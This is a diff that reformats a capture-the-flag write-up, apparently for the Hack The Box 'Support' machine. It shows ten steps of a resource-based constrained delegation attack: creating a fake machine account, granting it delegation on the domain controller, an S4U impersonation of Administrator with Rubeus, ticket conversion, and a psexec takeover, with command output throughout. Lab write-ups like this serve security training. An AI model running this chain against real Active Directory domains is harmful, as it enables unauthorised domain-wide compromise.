@@ -309,12 +309,14 @@ For further information on Powermad.ps1 visit [https://offsec.tools/tool/powerma
 Now we just follow the instructions found with bloodhound to execute the exploit and take over the DC.
 
 * Step 1 (add-machine)
+
 ```bash
 New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
 [+] Machine account FAKE-COMP01 added
 
 ```
 * Step 2 (check if the machine has been created)
+
 ```bash
 Get-ADComputer -identity FAKE-COMP01
 
@@ -330,11 +332,13 @@ UserPrincipalName :
 ```
 
 * Step 3 (grant the DC permission to delegate the fake machine)
+
 ```bash
 Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
 ```
 
 * Step 4 (confirm step 3 worked)
+
 ```bash
 Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
 
@@ -351,6 +355,7 @@ SID                                  : S-1-5-21-1677581083-3380853377-188903654-
 UserPrincipalName                    :
 ```
 * Step 5 (generate an NTLM hash given a password for the fake machine)
+
 ```bash
 .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
 
@@ -376,6 +381,7 @@ UserPrincipalName                    :
 [*]       des_cbc_md5          : 5B045E854358687C
 ```
 * Step 6 S4U(Service For User) attack to impersonate the Administrato user using the fake machine account
+
 ```bash
 ../Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
 
@@ -494,9 +500,12 @@ UserPrincipalName                    :
       MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
 [+] Ticket successfully imported!
 ```
-* Step 7 (copy the base64 ticket.kirbi in a txt file on the attack machine and save it as ticket.kirbi.b64, then run the command ``` base64 -d ticket.kirbi.b64 > ticket.kirbi``` to decode to plaintext)
+* Step 7 
+
+(copy the base64 ticket.kirbi in a txt file on the attack machine and save it as ticket.kirbi.b64, then run the command ``` base64 -d ticket.kirbi.b64 > ticket.kirbi``` to decode to plaintext)
 
 * Step 8 (use impacket-ticketCoverter to convert ```ticket.kirbi``` to ```ticket.ccache``` so it can be used by our linux tools)
+
 ```bash
 impacket-ticketConverter ticket.kirbi ticket.ccache                                                       
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -505,10 +514,13 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [+] done
 ```
 * Step 9 (define the ccache ticket that will be used for the kerberos tools)
+
 ```bash
 export KRB5CCNAME=ticket.ccache
 ```
+
 * Step 10 (own the domain controller with impacket-psexec)
+
 ```bash
 impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
